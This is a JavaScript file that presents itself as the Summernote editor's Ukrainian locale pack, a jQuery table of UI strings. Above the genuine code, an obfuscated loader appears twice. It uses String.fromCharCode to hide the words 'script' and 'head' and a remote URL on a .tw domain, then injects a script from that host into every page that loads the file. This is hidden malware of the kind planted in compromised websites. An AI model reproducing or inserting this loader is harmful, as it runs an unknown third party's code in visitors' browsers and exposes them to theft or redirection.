Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(function ($) {
  $.extend($.summernote.lang, {
    'uk-UA': {
      font: {
        bold: 'Напівжирний',
        italic: 'Курсив',
        underline: 'Підкреслений',
        clear: 'Прибрати стилі шрифту',
        height: 'Висота лінії',
        name: 'Шрифт',
        strikethrough: 'Закреслений',
        subscript: 'Нижній індекс',
        superscript: 'Верхній індекс',
        size: 'Розмір шрифту'
      },
      image: {
        image: 'Картинка',
        insert: 'Вставити картинку',
        resizeFull: 'Відновити розмір',
        resizeHalf: 'Зменшити до 50%',
        resizeQuarter: 'Зменшити до 25%',
        floatLeft: 'Розташувати ліворуч',
        floatRight: 'Розташувати праворуч',
        floatNone: 'Початкове розташування',
        dragImageHere: 'Перетягніть сюди картинку',
        selectFromFiles: 'Вибрати з файлів',
        url: 'URL картинки',
        remove: 'Видалити картинку'
      },
      link: {
        link: 'Посилання',
        insert: 'Вставити посилання',
        unlink: 'Прибрати посилання',
        edit: 'Редагувати',
        textToDisplay: 'Текст, що відображається',
        url: 'URL для переходу',
        openInNewWindow: 'Відкривати у новому вікні'
      },
      table: {
        table: 'Таблиця'
      },
      hr: {
        insert: 'Вставити горизонтальну лінію'
      },
      style: {
        style: 'Стиль',
        normal: 'Нормальний',
        blockquote: 'Цитата',
        pre: 'Код',
        h1: 'Заголовок 1',
        h2: 'Заголовок 2',
        h3: 'Заголовок 3',
        h4: 'Заголовок 4',
        h5: 'Заголовок 5',
        h6: 'Заголовок 6'
      },
      lists: {
        unordered: 'Маркований список',
        ordered: 'Нумерований список'
      },
      options: {
        help: 'Допомога',
        fullscreen: 'На весь екран',
        codeview: 'Початковий код'
      },
      paragraph: {
        paragraph: 'Параграф',
        outdent: 'Зменшити відступ',
        indent: 'Збільшити відступ',
        left: 'Вирівняти по лівому краю',
        center: 'Вирівняти по центру',
        right: 'Вирівняти по правому краю',
        justify: 'Розтягнути по ширині'
      },
      color: {
        recent: 'Останній колір',
        more: 'Ще кольори',
        background: 'Колір фону',
        foreground: 'Колір шрифту',
        transparent: 'Прозорий',
        setTransparent: 'Зробити прозорим',
        reset: 'Відновити',
        resetToDefault: 'Відновити початкові'
      },
      shortcut: {
        shortcuts: 'Комбінації клавіш',
        close: 'Закрити',
        textFormatting: 'Форматування тексту',
        action: 'Дія',
        paragraphFormatting: 'Форматування параграфу',
        documentStyle: 'Стиль документу'
      },
      history: {
        undo: 'Відмінити',
        redo: 'Повторити'
      }
    }
  });
})(jQuery);
